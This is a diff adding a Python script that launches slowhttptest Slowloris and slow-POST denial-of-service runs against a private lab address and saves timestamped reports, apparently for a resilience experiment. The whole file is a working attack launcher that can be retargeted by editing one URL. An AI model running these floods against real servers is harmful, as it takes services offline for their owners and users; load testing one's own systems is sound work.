@@ -1,0 +1,93 @@
+#!/usr/bin/env python3
+import subprocess
+import sys
+from datetime import datetime
+
+# -----------------------------------------
+# SlowHTTPTest Experiment Launcher
+# -----------------------------------------
+# This script runs:
+#   H = Slow Headers (Slowloris)
+#   B = Slow Body (Slow POST)
+#
+# Each run is automatically timestamped so
+# output files NEVER overwrite each other.
+# -----------------------------------------
+
+TARGET_URL = "http://192.168.42.8:5000/"
+
+def timestamp():
+    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+
+
+def run_slow_headers():
+    ts = timestamp()
+    output_prefix = f"slowheaders_{ts}"
+
+    cmd = [
+        "slowhttptest",
+        "-H",
+        "-c", "300",
+        "-i", "10",
+        "-r", "30",
+        "-u", TARGET_URL,
+        "-p", "5",
+        "-l", "120",
+        "-g",
+        "-o", output_prefix,
+    ]
+
+    print("\n▶ Running SLOW HEADERS (Slowloris) attack")
+    print(f"▶ Output files: {output_prefix}.html / .csv")
+    print("▶ Command:")
+    print("  " + " ".join(cmd))
+    subprocess.run(cmd)
+
+
+def run_slow_body():
+    ts = timestamp()
+    output_prefix = f"slowbody_{ts}"
+
+    cmd = [
+        "slowhttptest",
+        "-B",
+        "-c", "300",
+        "-i", "10",
+        "-r", "30",
+        "-u", TARGET_URL,
+        "-p", "5",
+        "-l", "120",
+        "-g",
+        "-o", output_prefix,
+    ]
+
+    print("\n▶ Running SLOW BODY (Slow POST) attack")
+    print(f"▶ Output files: {output_prefix}.html / .csv")
+    print("▶ Command:")
+    print("  " + " ".join(cmd))
+    subprocess.run(cmd)
+
+
+def print_usage():
+    print("Usage:")
+    print("  python3 run_slow_tests.py H   # Slow Headers (Slowloris)")
+    print("  python3 run_slow_tests.py B   # Slow Body (Slow POST)")
+    print()
+    print(f"Target URL: {TARGET_URL}")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print_usage()
+        sys.exit(1)
+
+    mode = sys.argv[1].upper()
+
+    if mode == "H":
+        run_slow_headers()
+    elif mode == "B":
+        run_slow_body()
+    else:
+        print(f"Unknown mode: {mode}")
+        print_usage()
+        sys.exit(1)
